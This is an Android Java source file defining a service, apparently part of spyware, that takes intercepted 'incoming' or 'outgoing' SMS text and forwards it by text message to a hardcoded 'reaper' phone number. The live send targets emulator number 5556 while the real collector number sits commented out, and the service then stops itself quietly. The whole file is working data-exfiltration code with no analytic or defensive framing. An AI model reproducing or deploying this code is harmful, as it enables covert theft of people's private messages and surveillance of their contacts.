package com.bigeye.crasher;

import android.app.IntentService;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

public class Send2ReaperService extends IntentService {

	public String OPERATION = ""; //incoming | outgoing
	public String MSG = "";
	public String REAPER = "+254714180870"; 
	public String APP_TAG = "Send2ReaperService";
	
	public Send2ReaperService() {
		super("SendSMSToReaper");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		//get msg from bundle
		OPERATION = intent.getStringExtra("OPERATION");
		MSG = intent.getStringExtra("MSG");
		
		Send2Reaper();
		
		//committing suicide
		Log.i(APP_TAG, "All Texts sent! committing suicide");
		stopSelf();
		
	}
	
	// **** SEND TEXTS IN BURSTS OF 10 SECS *** /// - STAY UC
	
	//send sms to reaper
	public void Send2Reaper(){
		SmsManager sms = SmsManager.getDefault();
//		sms.sendTextMessage(REAPER, null, MSG, null, null);
		sms.sendTextMessage("5556", null, MSG, null, null);
		Log.i(APP_TAG,"Sending Text: "+MSG);
	}

}
